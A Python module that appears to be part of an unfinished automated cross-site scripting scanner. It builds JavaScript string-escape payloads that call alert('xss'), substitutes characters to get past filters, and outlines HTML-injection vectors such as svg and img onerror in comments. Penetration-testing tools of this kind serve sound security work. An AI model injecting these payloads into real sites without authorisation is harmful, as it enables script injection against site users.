from models import AttackType, Payload, PayloadType, RequestModel, FilterModel
from modules.utils import *


BASE_PAYLOADS = {
    "ESCAPE_JS": [
        {
            "payload": """"; FUNCTION('ARGS'); var dummy= " """,
            "used_chars": ['"', ';','FUNCTION', '(', 'ARGS', ')', "'"]
        },
        {
            "payload": """'; FUNCTION("ARGS"); var dummy= ' """,
            "used_chars": ["'", ';','FUNCTION', '(', 'ARGS', ')', '"']
        },
        {
            "payload": """`; FUNCTION("ARGS"); var dummy= ` """,
            "used_chars": ["`", ';','FUNCTION', '(', 'ARGS', ')', '"']
        }
    ]
}


def replace_list_element(l: list, old: str, new: str) -> list: l[l.index(old)] = new; return l


def build_ESCAPE_JS_payload(requestModel: RequestModel, filterModel: FilterModel, lastTestedPayload: Payload | None, failedData: list) -> Payload | None:
    """
    Builds payloads for the ESCAPE_JS attack type
    """

    if lastTestedPayload is None:
        # take the first payload which has the expected escape char
        for base_payload in BASE_PAYLOADS["ESCAPE_JS"]: 
            if base_payload['used_chars'][0] == requestModel.escapeChar: payload = base_payload;break

        payload_str = payload['payload']

        # TODO: mettre toutes les fonctions equivalentes au alert, puis au fetch, 
        payload_str = payload_str.replace("FUNCTION", "alert")
        usedCharsReplaced = replace_list_element(payload['used_chars'].copy(), 'FUNCTION', 'alert')
        payloadType = PayloadType.ALERT

        # TODO: mettre les arguments en fonction du type alert ou request bin
        payload_str = payload_str.replace("ARGS", "xss")
        usedCharsReplaced = replace_list_element(usedCharsReplaced, 'ARGS', 'xss')

    else:
        if len(failedData) == 0:
            # if there is no failed data, it means that the last tested payload was in the response but didn't trigger the alert
            # so we need to try the next payload
            raise NotImplementedError("Not implemented yet (in build_ESCAPE_JS_payload)")

        # replace the failed data with the next possible value
        for data in failedData:
            newChar = SPECIAL_CHARS['for_js_escape'][data]
            payload_str = lastTestedPayload.value.replace(data, newChar)

    payloadType = PayloadType.ALERT # TODO: remove
    return Payload(value=payload_str, payloadType=payloadType, usedChars=payload['used_chars'], usedCharsReplaced=usedCharsReplaced)



def build_INJECT_HTML_payload():
    # TODO: d'abord essayer d'injecter un script dans une balise script
    # si on detecte pas la baise dans le dom on essaye une autre similaire (svg avec du js, ou une img avec un onerror)
    # ...

    raise NotImplementedError("INJECT_HTML not implemented yet")



def get_payload_generator(attackType: AttackType) -> callable:
    """
    Returns the payload generator for the given attack type
    """
    if attackType == AttackType.ESCAPE_JS:
        return build_ESCAPE_JS_payload
    
    elif attackType == AttackType.INJECT_HTML:
        return build_INJECT_HTML_payload
    
    else:
        raise NotImplementedError(f"Attack type {attackType} not implemented yet")